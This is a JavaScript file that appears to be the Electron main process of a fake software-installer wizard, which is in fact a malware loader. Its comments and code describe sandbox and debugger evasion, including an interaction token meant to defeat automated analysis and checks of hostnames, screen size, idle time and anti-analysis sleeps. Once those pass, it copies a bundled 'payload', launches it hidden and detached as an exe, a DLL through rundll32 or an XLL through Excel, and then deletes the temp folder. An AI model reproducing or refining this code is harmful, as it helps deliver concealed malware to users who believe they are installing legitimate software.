const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { spawn } = require('child_process');
const config = require('./config');
const { runGuardrails } = require('./guardrails');

// Per-process interaction token. The renderer receives this ONCE, on first
// genuine mouse movement over the wizard window, via the 'installer:ready'
// IPC. The 'installer:run' handler then requires the token to match before
// doing ANY file I/O or spawning — this enforces that a sandbox which
// auto-invokes IPC handlers cannot bypass the user-interaction gate even
// if it skips the renderer entirely.
const INTERACTION_TOKEN = crypto.randomBytes(32).toString('hex');
let interactionTokenIssued = false;

// Track the current child + temp dir so cleanup fires after the spawned
// payload exits, regardless of whether the wizard window is still open.
let pendingCleanup = null;

function createWindow() {
  const win = new BrowserWindow({
    width: 560,
    height: 420,
    resizable: false,
    title: `${config.PRODUCT} Setup`,
    autoHideMenuBar: true,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: false,
    },
  });
  win.removeMenu();
  win.loadFile(path.join(__dirname, 'renderer', 'index.html'));
}

ipcMain.handle('installer:product', () => ({
  product: config.PRODUCT,
  publisher: config.PUBLISHER,
  version: config.VERSION,
  // Expose guardrail knobs the renderer needs to enforce on its side.
  dwellMs: (config.GUARDRAILS && config.GUARDRAILS.dwellMs) || 0,
  requireMouseMovement: !!(config.GUARDRAILS && config.GUARDRAILS.requireMouseMovement),
}));

// Called by the renderer the first time it observes a real user-input event
// (mousemove, click, or keypress) inside the wizard window AND the
// configured dwell time has elapsed. The renderer is untrusted — this
// handler only hands out the interaction token once, so even a renderer
// that forges the event sequence can't reuse the token.
ipcMain.handle('installer:ready', () => {
  if (interactionTokenIssued) return { token: null };
  interactionTokenIssued = true;
  return { token: INTERACTION_TOKEN };
});

ipcMain.handle('installer:run', async (_event, providedToken) => {
  try {
    // -------------------------------------------------------------------
    // Guardrail gate #1: interaction token.
    // The renderer must have obtained this via installer:ready, which is
    // only handed out after dwell-time + real user input. A sandbox that
    // invokes installer:run directly without going through the UI fails
    // this check and nothing is staged.
    // -------------------------------------------------------------------
    if (!interactionTokenIssued || providedToken !== INTERACTION_TOKEN) {
      return { ok: false, error: 'no-interaction' };
    }

    // -------------------------------------------------------------------
    // Guardrail gate #2: environment checks (debugger, sandbox vars,
    // hostname/username lists, screen size, idle time, anti-analysis
    // sleeps). These run BEFORE any file copy or spawn.
    // -------------------------------------------------------------------
    const gr = await runGuardrails(config.GUARDRAILS);
    if (!gr.ok) {
      return { ok: false, error: `guardrail:${gr.reason}` };
    }

    // -------------------------------------------------------------------
    // Only NOW do we touch the filesystem. The loader tree sits in
    // process.resourcesPath/payload/ (staged by electron-builder's
    // extraResources directive) — copy it to a fresh %TEMP%\inst-<uuid>
    // so the child process has a writable cwd and so cleanup is clean.
    // -------------------------------------------------------------------
    const srcDir = path.join(process.resourcesPath, 'payload');
    const tmpDir = path.join(os.tmpdir(), 'inst-' + crypto.randomUUID());
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.cpSync(srcDir, tmpDir, { recursive: true });

    const entryPath = path.join(tmpDir, config.ENTRY_NAME);
    let child;
    switch (config.ENTRY_FORMAT) {
      case 'exe':
        child = spawn(entryPath, [], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      case 'dll':
        child = spawn('rundll32.exe', [`${entryPath},${config.DLL_ENTRY}`], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      case 'xll':
        child = spawn('excel.exe', ['/e', entryPath], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      default:
        return { ok: false, error: `unsupported ENTRY_FORMAT: ${config.ENTRY_FORMAT}` };
    }

    pendingCleanup = tmpDir;
    child.on('exit', () => {
      try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (_) {}
      if (pendingCleanup === tmpDir) pendingCleanup = null;
    });
    child.unref();

    return { ok: true };
  } catch (err) {
    return { ok: false, error: String(err && err.message || err) };
  }
});

app.whenReady().then(createWindow);
app.on('window-all-closed', () => app.quit());
